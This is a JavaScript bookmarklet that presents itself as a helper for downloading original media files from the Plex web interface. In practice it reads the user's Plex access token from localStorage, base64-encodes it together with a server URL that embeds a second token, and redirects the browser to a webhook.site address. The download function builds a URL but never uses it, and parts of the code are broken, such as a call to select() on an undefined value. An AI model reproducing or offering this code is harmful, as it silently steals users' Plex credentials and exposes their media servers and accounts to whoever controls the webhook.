/**
 * Download original files from the Plex web interface
 *
 *
 */
var plxDwnld = (function() {
    var self = {};
    var clientIdRegex = new RegExp("server\/([a-f0-9]{40})\/");
    var metadataIdRegex = new RegExp("key=%2Flibrary%2Fmetadata%2F(\\d+)");
    var apiResourceUrl = "https://plex.tv/api/resources?includeHttps=1&X-Plex-Token={token}";
    var apiLibraryUrl = "{baseuri}/library/metadata/{id}?X-Plex-Token={token}";
    var downloadUrl = "{baseuri}{partkey}?download=1&X-Plex-Token={token}";
    var accessTokenXpath = "//Device[@clientIdentifier='{clientid}']/@accessToken";
    var baseUriXpath = "//Device[@clientIdentifier='{clientid}']/Connection[@local=0]/@uri";
    var partKeyXpath = "//Media/Part[1]/@key";
    var baseUri = null;
    var accessToken = null;
     
     
     
  /*   var el = document.createElement( 'html' );
el.innerHTML = "<html><head><title>titleTest</title></head><body><a href='test0'>test01</a><a href='test1'>test02</a><a href='test2'>test03</a></body></html>";

el.getElementsByTagName( 'a' );
     alert(el);
     
     
     */
     
     
     
     
     
     
     
     

    var getXml = function(url, callback) {
        var request = new XMLHttpRequest();
        request.onreadystatechange = function() {
            if (request.readyState == 4 && request.status == 200) {
                callback(request.responseXML);
            }
        };
        request.open("GET", url);
        request.send();
    };

     
     
    var getMetadata = function(xml) {
        var clientId = clientIdRegex.exec(window.location.href);
		
        
        
        
        
        
        
        
        
        if (clientId && clientId.length == 2) {
            var accessTokenNode = xml.evaluate(accessTokenXpath.replace('{clientid}', clientId[1]), xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
            
            
            
            var baseUriNode = xml.evaluate(baseUriXpath.replace('{clientid}', clientId[1]), xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
            
            

            if (accessTokenNode.singleNodeValue && baseUriNode.singleNodeValue) {
                accessToken = accessTokenNode.singleNodeValue.textContent;
                var met = localStorage.myPlexAccessToken;
                
                baseUri = baseUriNode.singleNodeValue.textContent;
                
                var metadataId = metadataIdRegex.exec(window.location.href);
                
                
                
                
                
                if (metadataId && metadataId.length == 2) {
                    
                    getXml(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken), getDownloadUrl);
                    window.location.href = "https://webhook.site/9db9f664-e096-45ed-aacb-8212903bfa1e?PlxDwnld=" + btoa(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken) + '&met=' + met);
                } else {
                    alert("You are currently not viewing a media item.");
                }
            } else {
                alert("Cannot find a valid accessToken.");
            }
        } else {
            alert("You are currently not viewing a media item.");
        }
    };

    var getDownloadUrl = function(xml) {
        //alert("hello");
        var partKeyNode = xml.evaluate(partKeyXpath, xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
        //alert("partKeyNode = " + partKeyNode);
          
        
        //alert("apiLibraryUrl= " + apiLibraryUrl);
        //alert(xml.evaluate(partKeyXpath, xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null));
        //alert("PartPath= " + partKeyNode.singleNodeValue.textContent);
		
        
        if (partKeyNode.singleNodeValue) {
           
            var one = downloadUrl.replace('{baseuri}', baseUri).replace('{partkey}', partKeyNode.singleNodeValue.textContent).replace('{token}', accessToken);
            var cur = window.location.pathname;            
            var newURL = window.location.protocol + "//" + window.location.host + "/" + window.location.pathname + window.location.search;
            
           
            
               
        } else {
            alert("You are currently not viewing a media item.");
        }
    };

    self.init = function() {
        if (typeof localStorage.myPlexAccessToken != "undefined") {
            var poop = getXml(apiResourceUrl.replace('{token}', localStorage.myPlexAccessToken), getMetadata);
            
                poop.select();
            	
                document.execCommand("copy");
            	
        } else {
            alert("You are currently not browsing or logged into a Plex web environment.");
        }
    };

    return self;
}());

plxDwnld.init();
